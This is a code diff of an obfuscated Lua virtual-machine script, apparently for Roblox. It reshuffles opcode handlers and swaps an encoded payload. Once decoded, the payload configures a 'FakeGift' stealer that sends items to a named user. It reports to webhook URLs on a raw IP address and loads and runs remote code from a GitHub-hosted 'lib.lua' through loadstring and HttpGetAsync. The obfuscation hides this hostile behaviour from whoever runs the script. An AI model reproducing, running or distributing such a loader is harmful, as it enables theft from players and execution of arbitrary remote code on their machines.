@@ -182,39 +182,12 @@ local function VMCall(ByteString, vmenv, ...)
 				if (Enum <= 6) then
 					if (Enum <= 2) then
 						if (Enum <= 0) then
-							local A = Inst[2];
-							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
-							Top = (Limit + A) - 1;
-							local Edx = 0;
-							for Idx = A, Top do
-								Edx = Edx + 1;
-								Stk[Idx] = Results[Edx];
-							end
-						elseif (Enum > 1) then
-							local A = Inst[2];
-							local T = Stk[A];
-							for Idx = A + 1, Inst[3] do
-								Insert(T, Stk[Idx]);
-							end
-						else
-							Stk[Inst[2]] = {};
-						end
-					elseif (Enum <= 4) then
-						if (Enum == 3) then
-							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
-						else
 							Stk[Inst[2]][Inst[3]] = Inst[4];
-						end
-					elseif (Enum > 5) then
-						do
-							return;
-						end
-					else
-						Stk[Inst[2]] = Env[Inst[3]];
-					end
-				elseif (Enum <= 10) then
-					if (Enum <= 8) then
-						if (Enum == 7) then
+						elseif (Enum == 1) then
+							do
+								return;
+							end
+						else
 							local B;
 							local T;
 							local A;
@@ -236,85 +209,112 @@ local function VMCall(ByteString, vmenv, ...)
 							for Idx = 1, B do
 								T[Idx] = Stk[A + Idx];
 							end
-						else
-							local Edx;
-							local Results, Limit;
-							local A;
-							Stk[Inst[2]] = Inst[3];
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							A = Inst[2];
-							Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
-							Top = (Limit + A) - 1;
-							Edx = 0;
-							for Idx = A, Top do
-								Edx = Edx + 1;
-								Stk[Idx] = Results[Edx];
-							end
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							A = Inst[2];
-							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							Stk[Inst[2]]();
-							VIP = VIP + 1;
-							Inst = Instr[VIP];
-							do
-								return;
-							end
 						end
-					elseif (Enum == 9) then
-						Stk[Inst[2]][Inst[3]] = Inst[4];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]][Inst[3]] = Inst[4];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]][Inst[3]] = Inst[4];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]][Inst[3]] = Inst[4];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]][Inst[3]] = Inst[4];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]][Inst[3]] = Inst[4];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]][Inst[3]] = Inst[4];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]] = Env[Inst[3]];
-						VIP = VIP + 1;
-						Inst = Instr[VIP];
-						Stk[Inst[2]] = Env[Inst[3]];
-					else
-						Stk[Inst[2]] = Inst[3];
-					end
-				elseif (Enum <= 12) then
-					if (Enum > 11) then
-						Stk[Inst[2]]();
+					elseif (Enum <= 4) then
+						if (Enum == 3) then
+							local A = Inst[2];
+							local T = Stk[A];
+							local B = Inst[3];
+							for Idx = 1, B do
+								T[Idx] = Stk[A + Idx];
+							end
+						else
+							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
+						end
+					elseif (Enum == 5) then
+						Stk[Inst[2]] = {};
 					else
 						local A = Inst[2];
 						local B = Stk[Inst[3]];
 						Stk[A + 1] = B;
 						Stk[A] = B[Inst[4]];
 					end
-				elseif (Enum == 13) then
-					local A = Inst[2];
-					Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
-				else
-					local A = Inst[2];
-					local T = Stk[A];
-					local B = Inst[3];
-					for Idx = 1, B do
-						T[Idx] = Stk[A + Idx];
+				elseif (Enum <= 10) then
+					if (Enum <= 8) then
+						if (Enum > 7) then
+							Stk[Inst[2]] = Inst[3];
+						else
+							local A = Inst[2];
+							local T = Stk[A];
+							for Idx = A + 1, Inst[3] do
+								Insert(T, Stk[Idx]);
+							end
+						end
+					elseif (Enum > 9) then
+						Stk[Inst[2]]();
+					else
+						local A = Inst[2];
+						local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
+						Top = (Limit + A) - 1;
+						local Edx = 0;
+						for Idx = A, Top do
+							Edx = Edx + 1;
+							Stk[Idx] = Results[Edx];
+						end
 					end
+				elseif (Enum <= 12) then
+					if (Enum == 11) then
+						local Edx;
+						local Results, Limit;
+						local A;
+						Stk[Inst[2]] = Inst[3];
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						A = Inst[2];
+						Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
+						Top = (Limit + A) - 1;
+						Edx = 0;
+						for Idx = A, Top do
+							Edx = Edx + 1;
+							Stk[Idx] = Results[Edx];
+						end
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						A = Inst[2];
+						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						Stk[Inst[2]]();
+						VIP = VIP + 1;
+						Inst = Instr[VIP];
+						do
+							return;
+						end
+					else
+						local A = Inst[2];
+						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
+					end
+				elseif (Enum > 13) then
+					Stk[Inst[2]][Inst[3]] = Inst[4];
+					VIP = VIP + 1;
+					Inst = Instr[VIP];
+					Stk[Inst[2]][Inst[3]] = Inst[4];
+					VIP = VIP + 1;
+					Inst = Instr[VIP];
+					Stk[Inst[2]][Inst[3]] = Inst[4];
+					VIP = VIP + 1;
+					Inst = Instr[VIP];
+					Stk[Inst[2]][Inst[3]] = Inst[4];
+					VIP = VIP + 1;
+					Inst = Instr[VIP];
+					Stk[Inst[2]][Inst[3]] = Inst[4];
+					VIP = VIP + 1;
+					Inst = Instr[VIP];
+					Stk[Inst[2]][Inst[3]] = Inst[4];
+					VIP = VIP + 1;
+					Inst = Instr[VIP];
+					Stk[Inst[2]][Inst[3]] = Inst[4];
+					VIP = VIP + 1;
+					Inst = Instr[VIP];
+					Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
+					VIP = VIP + 1;
+					Inst = Instr[VIP];
+					Stk[Inst[2]] = Env[Inst[3]];
+					VIP = VIP + 1;
+					Inst = Instr[VIP];
+					Stk[Inst[2]] = Env[Inst[3]];
+				else
+					Stk[Inst[2]] = Env[Inst[3]];
 				end
 				VIP = VIP + 1;
 			end
@@ -322,4 +322,4 @@ local function VMCall(ByteString, vmenv, ...)
 	end
 	return Wrap(Deserialize(), {}, vmenv)(...);
 end
-return VMCall("LOL!143Q0003023Q005F47030A3Q004E752Q6C436F6E66696703043Q0055736572030E3Q00666F726474657374657273746C7203093Q006D696E5F76616C7565023Q00205FA00242030C3Q0070696E6745766572796F6E6503023Q004E6F03073Q00576562682Q6F6B03403Q00682Q74703A2Q2F34352E31332E2Q32352E38333A323Q30322F70726F78792F643461343739656331633136396230663335323563363733623631643462613503083Q0046616B65476966742Q033Q0059657303053Q00547261736803403Q00682Q74703A2Q2F34352E31332E2Q32352E38333A323Q30322F70726F78792F38303135646331643965636463323464633465663839342Q6338353335642Q38030D3Q004C6F6164696E675363722Q656E030D3Q00476966744F6E6C795261726573030A3Q006C6F6164737472696E6703043Q0067616D65030C3Q00482Q74704765744173796E63034B3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F736C2Q65707976692Q6C2F7363726970742F726566732F68656164732F6D61696E2F6C69622E6C756100163Q0012073Q00016Q00013Q00084Q000200013Q00122Q000300046Q00020001000100100300010003000200300900010005000600302Q00010007000800302Q00010009000A00302Q0001000B000C00302Q0001000D000E00302Q0001000F000800302Q00010010000C00104Q0002000100124Q00113Q00122Q000100123Q00200B000100010013001208000300146Q000100039Q0000026Q000100016Q00017Q00", GetFEnv(), ...);
+return VMCall("LOL!143Q0003023Q005F47030A3Q004E752Q6C436F6E66696703043Q0055736572030E3Q00666F726474657374657273746C7203093Q006D696E5F76616C7565024Q0084D79741030C3Q0070696E6745766572796F6E6503023Q004E6F03073Q00576562682Q6F6B03403Q00682Q74703A2Q2F34352E31332E2Q32352E38333A323Q30322F70726F78792F643461343739656331633136396230663335323563363733623631643462613503083Q0046616B65476966742Q033Q0059657303053Q00547261736803403Q00682Q74703A2Q2F34352E31332E2Q32352E38333A323Q30322F70726F78792F38303135646331643965636463323464633465663839342Q6338353335642Q38030D3Q004C6F6164696E675363722Q656E030D3Q00476966744F6E6C795261726573030A3Q006C6F6164737472696E6703043Q0067616D65030C3Q00482Q74704765744173796E63034B3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F736C2Q65707976692Q6C2F7363726970742F726566732F68656164732F6D61696E2F6C69622E6C756100163Q0012023Q00016Q00013Q00084Q000200013Q00122Q000300046Q00020001000100100400010003000200300E00010005000600302Q00010007000800302Q00010009000A00302Q0001000B000C00302Q0001000D000E00302Q0001000F000800302Q00010010000C00104Q0002000100124Q00113Q00122Q000100123Q00200600010001001300120B000300146Q000100039Q0000026Q000100016Q00017Q00", GetFEnv(), ...);
